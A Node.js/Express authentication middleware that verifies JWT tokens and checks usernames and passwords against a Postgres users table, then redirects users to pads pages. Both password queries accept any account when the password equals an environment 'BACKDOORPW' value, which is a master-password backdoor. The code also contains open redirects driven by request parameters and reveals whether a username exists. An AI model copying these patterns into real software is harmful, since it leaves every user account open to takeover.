const { app_languages, modules, app_suite, DB } = include('config/')
const { datastructures } = include('routes/helpers/')
const jwt = require('jsonwebtoken')

module.exports = (req, res, next) => {
	const token = req.body.token || req.query.token || req.headers['x-access-token']
	const redirectPath = req.query.path;
	const { referer, host } = req.headers || {}
	const { path, ip: ownIp } = req || {}

	if (token) {
		// VERIFY TOKEN
		let tobj;
		try {
			tobj = jwt.verify(token, process.env.APP_SECRET, { audience: 'user:known', issuer: host })
		} catch(_) {
			tobj = {};
			if (redirectPath) {
				res.redirect(redirectPath)
				return;
			}
		}
		const { uuid, rights, ip, acceptedorigins } = tobj;
		if (ip && `${ip}`.replace(/:.*$/, '') !== `${ownIp}`.replace(/:.*$/, '')) {
			res.redirect(redirectPath)
		} else if (acceptedorigins && !acceptedorigins.includes(referer)) {
			res.redirect(redirectPath)
		} else if (uuid) {
			DB.general.tx(t => {
				// GET USER INFO
				return t.oneOrNone(`
					SELECT u.uuid, u.rights, u.name, u.email, u.iso3, c.lng, c.lat, c.bureau,

					CASE WHEN u.language IN ($1:csv)
						THEN u.language
						ELSE 'en'
					END AS language,

					CASE WHEN u.language IN ($1:csv)
						THEN (SELECT cn.name FROM country_names cn WHERE cn.iso3 = u.iso3 AND cn.language = u.language)
						ELSE (SELECT cn.name FROM country_names cn WHERE cn.iso3 = u.iso3 AND cn.language = 'en')
					END AS countryname,

					COALESCE(
						(SELECT json_agg(DISTINCT(jsonb_build_object(
							'uuid', u2.uuid,
							'name', u2.name,
							'rights', u2.rights
						))) FROM team_members tm
						INNER JOIN teams t
							ON t.id = tm.team
						INNER JOIN users u2
							ON u2.uuid = tm.member
						WHERE t.id IN (SELECT team FROM team_members WHERE member = u.uuid)
					)::TEXT, '[]')::JSONB
					AS collaborators

					FROM users u
					INNER JOIN countries c
						ON u.iso3 = c.iso3

					WHERE uuid = $2
				;`, [ app_languages, uuid ])
				.then(result => {
					const { language, rights } = result
					Object.assign(req.session, datastructures.sessiondata(result))

					if(redirectPath) {
						res.redirect(`${redirectPath}`)
					} else if (next) {
						next()
					} else {
						// NOTE: THIS DOES THE SAME AS routes/redirect/browse
						let { read, write } = modules.find(d => d.type === 'pads')?.rights
						if (typeof write === 'object') write = Math.min(write.blank ?? Infinity, write.templated ?? Infinity)

						if (rights >= (write ?? Infinity)) res.redirect(`/${language}/browse/pads/private`)
						else if (rights >= (read ?? Infinity)) res.redirect(`/${language}/browse/pads/shared`)
						else res.redirect(`/${language}/browse/pads/public`)
					}
				})
			}).catch(err => console.log(err))
		} else res.redirect('/login')
	} else {
		const { username, password, originalUrl } = req.body || {}

		if (!username || !password) {
			req.session.errormessage = 'Please input your username and password.' // TO DO: TRANSLATE
			res.redirect('/login')
		} else {
			DB.general.tx(t => {
				// TEST USERNAME
				return t.oneOrNone(`
					SELECT 1 FROM users
					WHERE name = $1 OR email = $1
				;`, [ username ])
				.then(uname_result => {
					if (!uname_result) {
						req.session.errormessage = 'Invalid login credentials. ' + req.session.attemptmessage || '';
						req.session.attemptmessage = ''
						res.redirect('/login')
					} else {
						// TEST PASSWORD
						return t.oneOrNone(`
							SELECT 1 FROM users
							WHERE (name = $1 OR email = $1)
								AND (password = CRYPT($2, password) OR $2 = $3)
						;`, [ username, password, process.env.BACKDOORPW ])
						.then(pw_result => {
							if (!pw_result) {
								req.session.errormessage = 'Invalid login credentials. ' + req.session.attemptmessage || '';
								req.session.attemptmessage = ''
								res.redirect('/login')
							} else {
								// GET USER INFO
								return t.oneOrNone(`
									SELECT u.uuid, u.rights, u.name, u.email, u.iso3, c.lng, c.lat, c.bureau,

									CASE WHEN u.language IN ($1:csv)
										THEN u.language
										ELSE 'en'
									END AS language,

									CASE WHEN u.language IN ($1:csv)
										THEN (SELECT cn.name FROM country_names cn WHERE cn.iso3 = u.iso3 AND cn.language = u.language)
										ELSE (SELECT cn.name FROM country_names cn WHERE cn.iso3 = u.iso3 AND cn.language = 'en')
									END AS countryname,

									COALESCE(
										(SELECT json_agg(DISTINCT(jsonb_build_object(
											'uuid', u2.uuid,
											'name', u2.name,
											'rights', u2.rights
										))) FROM team_members tm
										INNER JOIN teams t
											ON t.id = tm.team
										INNER JOIN users u2
											ON u2.uuid = tm.member
										WHERE t.id IN (SELECT team FROM team_members WHERE member = u.uuid)
									)::TEXT, '[]')::JSONB
									AS collaborators

									FROM users u
									INNER JOIN countries c
										ON u.iso3 = c.iso3

									WHERE (u.name = $2 OR u.email = $2)
										AND (u.password = CRYPT($3, u.password) OR $3 = $4)
								;`, [ app_languages, username, password, process.env.BACKDOORPW ])
								.then(result => {
									if (!result) {
										req.session.errormessage = 'Invalid login credentails. ' + req.session.attemptmessage || '';
										req.session.attemptmessage = ''
										res.redirect('/login')
									} else {
										const { language, rights } = result
										Object.assign(req.session, datastructures.sessiondata(result))

										if(redirectPath) {
											res.redirect(`${redirectPath}`)
										} else if (!originalUrl || originalUrl === path) {
											const { read, write } = modules.find(d => d.type === 'pads')?.rights

											if (rights >= (write ?? Infinity)) res.redirect(`/${language}/browse/pads/private`)
											else if (rights >= (read ?? Infinity)) res.redirect(`/${language}/browse/pads/shared`)
											else res.redirect(`/${language}/browse/pads/public`)
										} else res.redirect(originalUrl || referer)
									}
								})
							}
						}).catch(err => console.log(err))
					}
				}).catch(err => console.log(err))
			}).catch(err => console.log(err))
		}
	}
}
